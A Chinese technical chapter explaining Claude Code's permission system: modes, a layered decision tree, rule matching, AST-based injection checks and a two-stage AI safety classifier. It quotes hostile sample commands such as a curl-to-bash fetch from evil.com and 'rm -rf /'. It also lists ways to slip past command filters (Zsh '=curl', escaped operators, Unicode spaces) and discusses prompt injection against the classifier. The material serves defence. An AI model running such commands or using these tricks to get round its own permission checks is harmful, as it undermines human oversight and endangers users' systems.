+++
date = '2026-06-09T00:00:00+08:00'
draft = false
title = "第6章 权限决策算法"
tags = ["AI Agent", "Claude Code", "算法思想", "权限决策", "安全"]
categories = ["AI Agent", "Claude Code"]
weight = 8
+++
## 6.1 问题引入：当 AI 获得了执行 Shell 命令的能力

想象一个场景：你让 AI 助手帮你整理项目目录。它需要执行 `rm` 命令删除临时文件、执行 `mv` 命令重命名文件、执行 `sed` 命令批量修改内容。这些操作本身无害，但同一个 `rm` 命令，参数从 `rm ./tmp/*.log` 变成 `rm -rf /`，后果就是灾难性的。

一个拥有 Shell 执行能力的 AI Agent，本质上获得了与用户等同的系统操作权限。它可以读取 `/etc/passwd`，可以通过 `curl` 将敏感数据发送到外部服务器，可以通过 `git push --force` 覆盖远程仓库的历史。更隐蔽的是，恶意指令可能被藏在看似无害的命令中——`cd /tmp && $(curl evil.com/payload.sh | bash)` 表面上只是切换目录，实际上隐藏了一个远程代码执行。

Claude Code 面对的核心挑战是：**如何在保持工具可用性的同时，建立一套可靠的安全边界？**

这不是一个简单的黑白名单问题。用户可能需要 `npm install` 但不需要 `npm publish`；可能需要 `git commit` 但不需要 `git push --force`；可能需要在项目目录内执行任意文件操作，但不应该触及 `~/.ssh/` 或 `.git/config`。权限决策必须是**细粒度**的、**上下文感知**的、**多层防御**的。

本章将深入 Claude Code 的权限系统源码，剖析其多层决策树算法、规则匹配引擎、AST 静态安全分析、AI 分类器协同决策等核心算法思想。

## 6.2 权限模式状态机

### 6.2.1 六种权限模式

Claude Code 定义了一组权限模式（Permission Mode），每种模式代表一种安全策略姿态。从源码 `types/permissions.ts` 中可以看到：

```
ExternalPermissionMode = 'default' | 'acceptEdits' | 'bypassPermissions' | 'dontAsk' | 'plan'
InternalPermissionMode = ExternalPermissionMode | 'auto' | 'bubble'
```

这些模式构成一个**策略梯度**，从最严格到最宽松依次为：

| 模式 | 安全级别 | 行为特征 |
|------|---------|---------|
| `plan` | 最严格 | 仅允许只读操作，所有写操作被拦截 |
| `default` | 标准 | 逐条命令请求用户确认 |
| `acceptEdits` | 中等 | 自动允许文件系统编辑操作（mkdir, touch, rm, cp, mv, sed） |
| `auto` | 智能 | 通过 AI 分类器自动判断是否安全（内部模式） |
| `dontAsk` | 宽松 | 将所有"询问"转为"拒绝"，适合无人值守场景 |
| `bypassPermissions` | 最宽松 | 跳过几乎所有权限检查（仍保留安全检查） |

关键的算法思想在于：**即使在最宽松的 `bypassPermissions` 模式下，某些安全检查仍然不可绕过**。源码中明确标注了三类"bypass-immune"检查：

1. **工具级拒绝规则**（步骤 1d）——如果工具实现本身返回 deny，bypass 模式也无法覆盖。
2. **内容级 ask 规则**（步骤 1f）——用户显式配置的 `Bash(npm publish:*)` 类 ask 规则，即使 bypass 也必须询问。
3. **安全路径检查**（步骤 1g）——对 `.git/`、`.claude/`、`.vscode/` 等敏感目录的操作，任何模式下都必须询问。

这种设计体现了**纵深防御（Defense in Depth）**原则：安全屏障不是单一的开关，而是层层叠加的，即使最外层被用户主动解除，核心安全约束仍然生效。

### 6.2.2 模式切换与状态传播

模式之间的切换不是任意的。`autoModeState.ts` 管理着 auto 模式的状态机：

```typescript
let autoModeActive = false
let autoModeFlagCli = false
let autoModeCircuitBroken = false  // 熔断器状态
```

`autoModeCircuitBroken` 是一个**熔断器模式**：当远程配置服务（GrowthBook）返回 `enabled === 'disabled'` 时，auto 模式被永久禁止重新进入——即使用户尝试手动切换回来也不行。这是典型的**故障安全（Fail-Safe）**设计：一旦检测到异常状态，系统锁死在安全侧，而非回退到不确定状态。

## 6.3 多层决策树算法

### 6.3.1 顶层决策流程

权限决策的入口是 `hasPermissionsToUseTool` 函数，它内部调用 `hasPermissionsToUseToolInner` 完成核心决策，然后在外层叠加 auto 模式和 dontAsk 模式的后处理。整个决策流程形成一棵**优先级决策树**：

```
hasPermissionsToUseTool(tool, input, context)
│
├── 步骤1: 拒绝检查 ──────────────── 最高优先级
│   ├── 1a. 工具级拒绝规则 (deny rule for entire tool)
│   ├── 1b. 工具级 ask 规则
│   ├── 1c. 工具实现的 checkPermissions()
│   ├── 1d. 工具实现返回 deny → 终止
│   ├── 1e. 需要用户交互的工具 → 终止
│   ├── 1f. 内容级 ask 规则 (bypass-immune) → 终止
│   └── 1g. 安全路径检查 (bypass-immune) → 终止
│
├── 步骤2: 允许检查
│   ├── 2a. bypassPermissions 模式 → 允许
│   └── 2b. 工具级允许规则 → 允许
│
├── 步骤3: passthrough → ask 转换
│
└── 后处理
    ├── dontAsk 模式: ask → deny
    ├── auto 模式: 走 AI 分类器
    │   ├── 快速路径: acceptEdits 检查
    │   ├── 快速路径: 安全工具白名单
    │   └── 完整路径: classifyYoloAction()
    └── 无头模式: ask → deny (运行 hooks)
```

这棵决策树有一个关键的设计原则：**deny 优先于 allow，allow 优先于 ask**。在任何层级，一旦遇到 deny 决策就立即返回，不再执行后续检查。这确保了安全约束不会被后续的宽松规则覆盖。

### 6.3.2 Bash 命令的专属决策链

对于 Bash 命令，`bashToolHasPermission` 函数实现了一条更精细的决策链，融合了 AST 解析、规则匹配、安全验证等多个子系统：

```
bashToolHasPermission(input, context)
│
├── 阶段0: AST 安全解析
│   ├── tree-sitter 解析命令 → SimpleCommand[] 或 'too-complex'
│   ├── too-complex → 早期拒绝检查 → ask
│   ├── simple → 语义检查 (checkSemantics)
│   │   └── 检测 eval/exec/zmodload 等危险命令
│   └── parse-unavailable → 退回 legacy shell-quote 解析
│
├── 阶段1: 沙箱自动允许
│   └── 沙箱启用且 autoAllow → 检查 deny/ask 规则 → 允许
│
├── 阶段2: 精确匹配检查
│   └── deny → ask → allow → passthrough (优先级递减)
│
├── 阶段3: 分类器规则检查 (Bash Classifier, 如启用)
│
├── 阶段4: 复合命令分解
│   ├── 将 "cmd1 && cmd2 || cmd3" 拆分为子命令
│   └── 每个子命令独立走完整决策链
│
├── 阶段5: 子命令级别检查
│   ├── 前缀/通配符规则匹配
│   ├── 路径约束检查
│   ├── sed 约束检查
│   ├── 模式特定处理
│   ├── 只读命令检测
│   └── 注入检测 (bashCommandIsSafe)
│
└── 阶段6: 结果聚合
    └── 任一子命令被拒绝 → 整体拒绝
```

这里有一个非常精妙的设计——**复合命令的安全困境**。考虑命令 `cd /path && python3 evil.py`，如果只看第一个子命令 `cd /path`，它是安全的；但作为整体，它在切换目录后执行了潜在危险的脚本。源码通过以下策略解决：

1. 使用 `splitCommand` 将复合命令拆分为原子子命令
2. 对每个子命令独立执行完整的权限检查
3. 采用**最严格合并**策略：任何一个子命令被拒绝，整条命令被拒绝
4. 设置子命令数量上限 `MAX_SUBCOMMANDS_FOR_SECURITY_CHECK = 50`，超过则直接要求用户确认

## 6.4 规则匹配算法

### 6.4.1 三种规则形态

Claude Code 的权限规则支持三种匹配模式，由 `parsePermissionRule` 函数解析：

```typescript
type ShellPermissionRule =
  | { type: 'exact'; command: string }      // 精确匹配: "npm install"
  | { type: 'prefix'; prefix: string }      // 前缀匹配: "npm:*"（legacy）
  | { type: 'wildcard'; pattern: string }   // 通配符匹配: "git * --force"
```

**精确匹配**最简单——命令字符串完全相等。但它也最不实用：`npm install lodash` 和 `npm install express` 是不同的命令，用户不可能为每个变体创建规则。

**前缀匹配**使用 `prefix:*` 语法（legacy 格式），例如 `npm:*` 匹配所有以 `npm` 开头的命令。这里有一个关键的**词边界保护**：

```typescript
// 确保词边界：前缀后必须是空格或字符串结束
// 这防止 "ls:*" 匹配 "lsof" 或 "lsattr"
if (cmdToMatch === bashRule.prefix) return true
if (cmdToMatch.startsWith(bashRule.prefix + ' ')) return true
```

**通配符匹配**使用 `matchWildcardPattern` 函数，将通配符模式编译为正则表达式：

```typescript
function matchWildcardPattern(pattern, command): boolean {
  // 1. 处理转义序列: \* → 字面星号, \\ → 字面反斜杠
  // 2. 转义正则特殊字符（除 * 外）
  // 3. 将未转义的 * 转换为 .*
  // 4. 特殊优化：'git *' 同时匹配 'git add' 和 'git'
  //    （trailing wildcard 使 space+args 变为可选）
  // 5. 启用 dotAll 模式（. 匹配换行符）
  const regex = new RegExp(`^${regexPattern}$`, 's')
  return regex.test(command)
}
```

通配符匹配中有一个巧妙的用户体验优化：当模式以 `' *'`（空格 + 星号）结尾且只有一个未转义星号时，空格和参数部分变为可选。这意味着规则 `Bash(git *)` 既能匹配 `git add`，也能匹配裸 `git` 命令。这与前缀规则 `git:*` 的语义保持一致。

### 6.4.2 deny 规则的非对称加固

一个重要的安全设计是 **deny 规则和 allow 规则使用不同的匹配策略**。对于 allow 规则，系统只剥离"安全"的环境变量前缀（如 `NODE_ENV=prod`、`RUST_LOG=debug`）；但对于 deny 规则，系统会剥离**所有**环境变量前缀：

```typescript
// allow 规则：只剥离安全环境变量
const matchingAllowRules = filterRulesByContentsMatchingInput(
  input, allowRules, 'prefix',
  { stripAllEnvVars: false }
)

// deny 规则：剥离所有环境变量
const matchingDenyRules = filterRulesByContentsMatchingInput(
  input, denyRules, 'prefix',
  { stripAllEnvVars: true, skipCompoundCheck: true }
)
```

这种非对称设计的原因在于安全边界的不同方向：

- **allow 规则的风险**：过度剥离环境变量可能导致 `DOCKER_HOST=evil.com docker ps` 错误地匹配 `Bash(docker ps:*)` allow 规则，绕过安全审查。
- **deny 规则的风险**：不充分剥离可能导致 `FOO=bar rm -rf /` 绕过 `Bash(rm:*)` deny 规则。

deny 规则的剥离还使用了**固定点迭代算法**来处理多层嵌套：

```typescript
// 迭代剥离，直到不再产生新候选
// 处理 nohup FOO=bar timeout 5 claude 这类多层嵌套
const seen = new Set(commandsToTry)
let startIdx = 0
while (startIdx < commandsToTry.length) {
  const endIdx = commandsToTry.length
  for (let i = startIdx; i < endIdx; i++) {
    const envStripped = stripAllLeadingEnvVars(cmd)
    if (!seen.has(envStripped)) {
      commandsToTry.push(envStripped)
      seen.add(envStripped)
    }
    const wrapperStripped = stripSafeWrappers(cmd)
    if (!seen.has(wrapperStripped)) {
      commandsToTry.push(wrapperStripped)
      seen.add(wrapperStripped)
    }
  }
  startIdx = endIdx
}
```

算法不断交替执行"剥离环境变量"和"剥离安全包装器（timeout, nice, nohup 等）"两个操作，直到不再产生新的命令变体。这确保了 `nohup FOO=bar timeout 5 claude` 这样的多层嵌套最终被剥离到 `claude`，从而被 deny 规则正确匹配。

### 6.4.3 安全环境变量白名单

`stripSafeWrappers` 函数维护了一份精心审核的安全环境变量白名单 `SAFE_ENV_VARS`，分为几个类别：

- **语言运行时配置**：`GOOS`, `GOARCH`, `NODE_ENV`, `RUST_BACKTRACE` 等——只影响构建目标或日志级别，不能执行代码。
- **显示与终端**：`TERM`, `NO_COLOR`, `FORCE_COLOR`, `TZ` 等——只影响输出格式。
- **语言环境**：`LANG`, `LC_ALL` 等——只影响字符编码。

源码中明确标注了**绝不能**加入白名单的变量：

```typescript
// SECURITY: These must NEVER be added to the whitelist:
// - PATH, LD_PRELOAD, LD_LIBRARY_PATH, DYLD_* (execution/library loading)
// - PYTHONPATH, NODE_PATH, CLASSPATH (module loading)
// - GOFLAGS, RUSTFLAGS, NODE_OPTIONS (can contain code execution flags)
// - HOME, TMPDIR, SHELL, BASH_ENV (affect system behavior)
```

这里 `NODE_OPTIONS` 尤其值得关注——它看似只是"选项"，但可以传入 `--require` 标志来加载任意 JavaScript 模块，本质上是一个代码执行入口。

## 6.5 AST 静态分析算法

### 6.5.1 为什么需要 AST 解析

正则表达式无法可靠地解析 Shell 命令。考虑以下对抗性输入：

```bash
cd src\&\& python3 hello.py
```

`splitCommand` 函数使用字符串分割来识别 `&&` 运算符。但这里的 `&&` 被反斜杠转义了，shell 会将其视为**字面字符**而非运算符。如果只用正则表达式分析，可能错误地将其拆分为两个子命令 `cd src` 和 `python3 hello.py`，第一个匹配 `cd:*` allow 规则，整条命令被放行。但实际上 shell 执行的是 `cd src&& python3 hello.py`（因为 `\&` 在某些 shell 中被去转义），这是一条复合命令。

Claude Code 引入了 **tree-sitter** 解析器来进行真正的 AST（抽象语法树）分析。`parseForSecurityFromAst` 函数将命令解析为结构化的 `SimpleCommand` 数组：

```typescript
type SimpleCommand = {
  text: string            // 原始文本
  argv: string[]          // 解析后的参数列表
  envVars: EnvVar[]       // 环境变量赋值
  redirects: Redirect[]   // 重定向
}

type ParseForSecurityResult =
  | { kind: 'simple'; commands: SimpleCommand[] }
  | { kind: 'too-complex'; reason: string; nodeType: string }
  | { kind: 'parse-unavailable' }
```

解析结果分为三种：

1. **simple**——命令是简单命令的线性组合，可以安全分析。
2. **too-complex**——命令包含命令替换 `$()`、进程替换 `<()`、复杂控制流等结构，无法静态确定安全性。
3. **parse-unavailable**——tree-sitter 不可用，回退到 legacy 路径。

### 6.5.2 语义检查算法

即使 AST 解析成功，某些命令虽然语法上是简单命令，但语义上是危险的。`checkSemantics` 函数检测以下类别：

1. **eval 类命令**：`eval`、`exec`——本质上是间接代码执行。
2. **Zsh 危险命令**：`zmodload`（可加载 `zsh/system` 模块实现任意文件 I/O）、`emulate -c`（eval 等价物）、`sysopen`/`syswrite`/`ztcp`（模块级危险操作）。
3. **安全包装器检测**：`nice`、`timeout`、`nohup` 等——tree-sitter 解析器会剥离这些包装器来检查被包装的真实命令。

### 6.5.3 注入检测：bashCommandIsSafe

当 tree-sitter 不可用时（legacy 路径），`bashCommandIsSafe` 函数通过一系列启发式验证器检测潜在的命令注入：

```
验证管线（Validation Pipeline）:
validateEmpty → validateIncompleteCommands → validateSafeCommandSubstitution
→ validateJqFilter → validateObfuscatedFlags → validateShellMetacharacters
→ validateDangerousVariables → validateNewlines → validateDangerousPatterns
→ validateIfsInjection → validateGitCommitSubstitution
→ validateProcEnvironAccess → validateMalformedTokenInjection
→ validateBackslashEscapedWhitespace → validateBraceExpansion
→ validateControlCharacters → validateUnicodeWhitespace → validateMidWordHash
→ validateZshDangerousCommands → validateBackslashEscapedOperators
→ validateCommentQuoteDesync → validateQuotedNewline
```

每个验证器检查一种特定的注入模式。例如：

- **命令替换检测**：检查 `$()`、`` ` ` ``、`<()`、`>()`、`${}`、`$[]` 等模式。
- **Zsh 特殊语法**：`=curl` 会被 Zsh 扩展为 `/usr/bin/curl`，绕过基于命令名的 deny 规则。
- **Unicode 白空格**：`\u00A0`（不间断空格）外观与普通空格相同，但 shell 可能将其视为参数的一部分而非分隔符。
- **引号内换行**：`echo "hello\nrm -rf /"` 中的换行符在某些上下文中可能被 shell 解释为命令分隔符。

一个特别精巧的检测是 **heredoc 安全分析**。函数 `isSafeHeredoc` 验证 `$(cat <<'EOF'...EOF)` 模式的安全性：

1. 定界符必须被单引号包裹（`'EOF'`）或反斜杠转义（`\EOF`），确保 heredoc 体内无变量扩展。
2. 闭合定界符必须是**第一个**匹配行（精确复现 bash 的行为）。
3. `$()` 必须在**参数位置**（前面有命令词），不能在命令名位置。
4. 剥离 heredoc 后的剩余文本必须通过所有验证器。
5. 不允许嵌套 heredoc（防止外层 heredoc 的字面体被误解析）。

## 6.6 AI 分类器协同决策

### 6.6.1 Auto 模式分类器架构

当权限模式为 `auto` 时，系统不再向用户询问，而是使用 AI 分类器自动判断操作是否安全。这是 Claude Code 权限系统中最复杂的部分，涉及多级快速路径和一个完整的 LLM 分类管线。

```
auto 模式决策流程:
│
├── 快速路径1: 安全检查(safetyCheck)不可分类器批准 → 直接拒绝
├── 快速路径2: acceptEdits 模式也会允许 → 直接允许（跳过分类器）
├── 快速路径3: 安全工具白名单 → 直接允许
│   （FileRead, Grep, Glob, LSP, TodoWrite, TaskCreate 等只读工具）
│
└── 完整路径: classifyYoloAction()
    ├── 构建对话转录（transcript）
    ├── 构建系统提示（含用户配置的 allow/deny 规则）
    ├── 调用 LLM 分类器
    └── 解析结果: shouldBlock / reason
```

快速路径的设计体现了**短路求值（Short-Circuit Evaluation）**思想：大部分操作（文件读取、搜索、任务管理）天然安全，无需调用昂贵的 LLM 分类器。`SAFE_YOLO_ALLOWLISTED_TOOLS` 白名单覆盖了约 20 种只读工具，直接返回允许。对于文件写入类操作，系统先模拟 `acceptEdits` 模式——如果该模式也会允许（即操作在工作目录内），则跳过分类器。

### 6.6.2 YOLO 分类器的两阶段决策

核心分类器 `classifyYoloActionXml` 实现了一个**两阶段（Two-Stage）**决策架构：

**第一阶段（Fast）**：向 LLM 发送精简提示，附加 `"Err on the side of blocking. <block> immediately."` 后缀，设置 `max_tokens=64`，并使用 `stop_sequences=['</block>']` 在收到决策标签后立即停止生成。如果第一阶段判定**允许**，直接返回（快速通过）。如果判定**阻止**或无法解析，进入第二阶段。

**第二阶段（Thinking）**：向 LLM 发送完整提示，附加 `"Review the classification process and follow it carefully..."` 后缀，设置 `max_tokens=4096`，允许模型进行思维链（Chain of Thought）推理。然后解析 `<thinking>...</thinking>` 和 `<block>yes/no</block>` 标签。

```
         第一阶段
            │
      ┌─────┴─────┐
   允许(no)     阻止(yes)/无法解析
      │             │
   返回允许      第二阶段
                    │
              ┌─────┴─────┐
           允许(no)     阻止(yes)
              │             │
           返回允许      返回阻止
```

这种设计背后的算法思想是**非对称决策成本**：

- **允许安全操作的成本**：低（最坏情况是多做了一次无害操作）。
- **允许危险操作的成本**：高（可能造成不可逆损害）。

因此，第一阶段偏向阻止（"err on the side of blocking"），用低延迟完成大部分安全操作的快速放行。只有当第一阶段阻止时，才投入更多计算资源进行深入分析，以减少误阻。

### 6.6.3 对话转录构建

分类器需要理解操作的**上下文**——同样是 `rm -rf build/`，如果用户刚刚说"帮我清理构建产物"，这就是合理操作；但如果用户什么都没说，AI 突然执行删除，就值得警惕。

`buildTranscriptEntries` 函数将对话历史转换为精简的转录格式。一个关键的安全设计是：**只包含用户的文本消息和助手的工具调用，排除助手的文本回复**。原因在于，助手的文本是模型生成的，可能被精心构造来影响分类器的判断（对分类器的"提示注入攻击"）。

```typescript
// 只包含 tool_use 块——助手文本是模型生成的，
// 可能被构造来影响分类器的决策
if (block.type === 'tool_use') {
  blocks.push({ type: 'tool_use', name: block.name, input: block.input })
}
```

转录使用紧凑的 JSONL 格式序列化：`{"Bash":"ls"}` 表示一次 Bash 工具调用，`{"user":"请帮我清理"}` 表示用户消息。JSON 编码确保恶意内容无法逃逸字符串上下文来伪造 `{"user":...}` 行。

### 6.6.4 分类器的可定制规则

用户可以通过 `settings.autoMode` 配置三类规则来定制分类器的行为：

- **allow**：描述应该被允许的操作模式（如 "Running npm install in the project directory"）。
- **soft_deny**：描述应该被阻止的操作模式（如 "Publishing packages to npm"）。
- **environment**：描述环境信息（如 "This is a Node.js project"）。

这些规则被注入到分类器的系统提示中，使用 `<user_*_to_replace>` 标签进行模板替换。外部版本的规则**替换**默认值，内部（Anthropic）版本的规则是**追加**的——这种区别确保内部版本始终保留基础安全规则。

### 6.6.5 拒绝追踪与熔断

分类器不是完美的，可能出现连续误阻的情况。`denialTracking.ts` 实现了一套**拒绝追踪与熔断**机制：

```typescript
const DENIAL_LIMITS = {
  maxConsecutive: 3,    // 连续拒绝 3 次
  maxTotal: 20,         // 总计拒绝 20 次
}

function shouldFallbackToPrompting(state): boolean {
  return state.consecutiveDenials >= DENIAL_LIMITS.maxConsecutive
      || state.totalDenials >= DENIAL_LIMITS.maxTotal
}
```

当连续拒绝 3 次或累计拒绝 20 次时，系统回退到人工确认模式，将分类器的拒绝原因展示给用户。任何一次成功的工具使用会重置连续拒绝计数器（但不重置总计计数器）：

```typescript
function recordSuccess(state): DenialTrackingState {
  if (state.consecutiveDenials === 0) return state // 无变化，返回同一引用
  return { ...state, consecutiveDenials: 0 }
}
```

注意 `recordSuccess` 在无需更新时返回**同一对象引用**——这不是偶然的，它利用了 React 风格状态管理中 `Object.is` 检查来跳过不必要的状态更新和 UI 重渲染。这种性能优化在热路径（每次工具调用都会触发）上尤为重要。

分类器不可用时（API 错误），行为取决于 `tengu_iron_gate_closed` 特性开关：

- **开启**（fail-closed）：拒绝操作并提示用户分类器不可用。
- **关闭**（fail-open）：回退到正常权限处理流程。

## 6.7 信任传播模型

### 6.7.1 子 Agent 的权限继承

Claude Code 支持多 Agent 架构，父 Agent 可以派生子 Agent 执行任务。子 Agent 的权限不是独立的，而是受父 Agent 上下文约束的。

在 `hasPermissionsToUseTool` 的后处理中，当 `shouldAvoidPermissionPrompts`（标识无头/后台 Agent）为 true 时，所有 `ask` 决策会被转换为 `deny`：

```typescript
if (appState.toolPermissionContext.shouldAvoidPermissionPrompts) {
  // 先运行 PermissionRequest hooks
  const hookDecision = await runPermissionRequestHooksForHeadlessAgent(...)
  if (hookDecision) return hookDecision
  // 无 hook 决策，自动拒绝
  return { behavior: 'deny', message: AUTO_REJECT_MESSAGE(tool.name) }
}
```

这意味着子 Agent 只能执行已被规则明确允许的操作。它不能"询问用户"——因为它运行在后台，没有 UI 交互能力。这种设计确保了**最小权限原则**：子 Agent 的权限范围永远不会超过其启动时的配置。

### 6.7.2 本地拒绝追踪

子 Agent 使用 `localDenialTracking` 而非全局 `appState.denialTracking`，因为子 Agent 的 `setAppState` 是空操作（no-op）。这确保了：

1. 每个子 Agent 有独立的拒绝计数器。
2. 子 Agent 的拒绝不会影响父 Agent 的熔断状态。
3. 子 Agent 到达自己的拒绝上限时独立终止。

## 6.8 缓存与性能优化

### 6.8.1 规则解析缓存

权限规则的解析是热路径上的高频操作。`bashPermissionRule` 函数是 `parsePermissionRule` 的直接代理：

```typescript
export const bashPermissionRule: (permissionRule: string) => ShellPermissionRule
  = parsePermissionRule
```

规则解析结果本身是纯函数（相同输入总是产生相同输出），源码中多处标注了对重复解析的关注。复合命令的 `isCompoundCommand` 检查也被提前批量计算：

```typescript
// 预计算复合命令状态，避免在规则过滤循环中重复解析
const isCompoundCommand = new Map<string, boolean>()
if (matchMode === 'prefix' && !skipCompoundCheck) {
  for (const cmd of commandsToTry) {
    if (!isCompoundCommand.has(cmd)) {
      isCompoundCommand.set(cmd, splitCommand(cmd).length > 1)
    }
  }
}
```

### 6.8.2 分类器缓存策略

YOLO 分类器使用 Anthropic API 的**提示缓存**机制。系统提示和 CLAUDE.md 内容被标记为 `cache_control`，使得跨分类器调用时这些稳定内容可以从缓存中读取（1 小时 TTL），大幅降低 token 消耗和延迟。

## 6.9 架构图解：权限决策完整流程

```
┌─────────────────────────────────────────────────────┐
│                  Agent 请求执行工具                    │
└─────────────────────┬───────────────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────────────┐
│          第一层：全局规则过滤                          │
│  ┌──────────┐  ┌──────────┐  ┌──────────────────┐  │
│  │工具级deny │→│工具级ask  │→│安全检查(bypass免疫)│  │
│  └────┬─────┘  └────┬─────┘  └────────┬─────────┘  │
│    deny↓          ask↓              ask↓             │
│   [终止]        [终止]            [终止]              │
│                                                      │
│  ┌──────────────┐  ┌──────────────────┐             │
│  │bypass模式检查 │→│工具级allow规则    │             │
│  └────┬─────────┘  └──────┬───────────┘             │
│    allow↓              allow↓                        │
│   [终止]              [终止]                          │
└─────────────────────┬───────────────────────────────┘
                      │ passthrough
                      ▼
┌─────────────────────────────────────────────────────┐
│          第二层：工具级权限检查                        │
│       （以 Bash 为例：bashToolHasPermission）         │
│                                                      │
│  ┌───────────────────┐                              │
│  │ AST 安全解析       │                              │
│  │ tree-sitter → AST  │                              │
│  │ checkSemantics     │                              │
│  └─────────┬─────────┘                              │
│            │                                         │
│  ┌─────────▼──────────┐                             │
│  │ 沙箱自动允许检查    │                              │
│  └─────────┬──────────┘                             │
│            │                                         │
│  ┌─────────▼──────────────────────┐                 │
│  │ 精确匹配 → 前缀匹配 → 通配符   │                 │
│  │ (deny > ask > allow 优先级)    │                 │
│  └─────────┬──────────────────────┘                 │
│            │                                         │
│  ┌─────────▼──────────┐                             │
│  │ 路径约束 / sed约束  │                              │
│  │ 模式特定处理        │                              │
│  │ 只读命令检测        │                              │
│  │ 注入检测           │                               │
│  └─────────┬──────────┘                             │
└────────────┬────────────────────────────────────────┘
             │ ask
             ▼
┌─────────────────────────────────────────────────────┐
│          第三层：模式后处理                            │
│                                                      │
│  ┌─────────────────┐                                │
│  │ dontAsk 模式     │─→ ask 转为 deny               │
│  └─────────────────┘                                │
│                                                      │
│  ┌─────────────────────────────────────────┐        │
│  │ auto 模式 (AI 分类器)                    │        │
│  │  ├─ 快速路径: acceptEdits / 白名单       │        │
│  │  └─ 两阶段 XML 分类器                   │        │
│  │     Stage 1 (fast) ──allow──→ 允许       │        │
│  │          │block                          │        │
│  │     Stage 2 (thinking)                   │        │
│  │          │                               │        │
│  │     ┌────┴────┐                          │        │
│  │   allow     block ─→ 拒绝追踪 ─→ 熔断?  │        │
│  │     │                     │              │        │
│  │   允许              回退人工确认          │        │
│  └─────────────────────────────────────────┘        │
│                                                      │
│  ┌─────────────────┐                                │
│  │ 无头模式         │─→ 运行 hooks → 自动拒绝       │
│  └─────────────────┘                                │
└─────────────────────────────────────────────────────┘
```

## 6.10 思考题

**思考题 1：非对称安全边界**

Claude Code 对 deny 规则和 allow 规则使用了不同的匹配策略（deny 规则剥离所有环境变量，allow 规则只剥离安全环境变量）。请分析：如果反过来——allow 规则使用更宽松的匹配，deny 规则使用更严格的匹配——会产生什么安全隐患？尝试构造一个具体的攻击场景。

**思考题 2：分类器的安全边界**

Auto 模式的 AI 分类器排除了助手文本（只保留工具调用）来防止"对分类器的提示注入"。但工具调用的输入参数（如 Bash 命令内容）仍然是模型生成的。请思考：一个恶意的提示注入是否可能通过精心构造的 Bash 命令参数来欺骗分类器？Claude Code 还有哪些防御层来应对这种情况？

**思考题 3：熔断器阈值的权衡**

拒绝追踪的阈值设为连续 3 次或累计 20 次。如果将连续阈值提高到 10 次，会对用户体验产生什么影响？如果降低到 1 次，又会对安全性产生什么影响？如何设计一个自适应阈值，根据会话的风险评估动态调整？

## 6.11 小结

Claude Code 的权限决策算法体现了多个经典安全工程原则的实践：

1. **纵深防御**：安全不依赖单一屏障，而是通过全局规则、工具级检查、AST 分析、AI 分类器等多个独立层次的叠加来实现。即使某一层被绕过，后续层仍然生效。

2. **最小权限原则**：子 Agent 只能执行已被明确允许的操作；无头模式下所有"询问"自动转为"拒绝"；安全路径检查在任何模式下都不可绕过。

3. **故障安全**：分类器不可用时默认拒绝（fail-closed）；AST 解析判定 too-complex 时要求用户确认；连续拒绝触发熔断回退到人工审核。

4. **非对称设计**：deny 规则使用更激进的匹配策略，因为漏掉一个危险命令的后果远大于误阻一个安全命令。第一阶段分类器偏向阻止，因为误放行的成本高于误阻止。

5. **可扩展的规则引擎**：精确匹配、前缀匹配、通配符匹配的三层规则体系，结合分层配置来源（用户设置、项目设置、CLI 参数、策略设置），为用户提供了从粗粒度到细粒度的完整权限控制谱。

从算法角度看，这套系统的核心是一棵**带优先级的多层决策树**，每一层都有明确的短路条件和传递规则。它不是简单的 if-else 链，而是一个精心设计的状态空间搜索——在安全性、可用性和性能之间寻找最优平衡点。分类器的两阶段架构则展示了如何将"快速但粗糙"和"慢速但精确"两种策略级联组合，在保持安全性的同时最小化延迟开销。
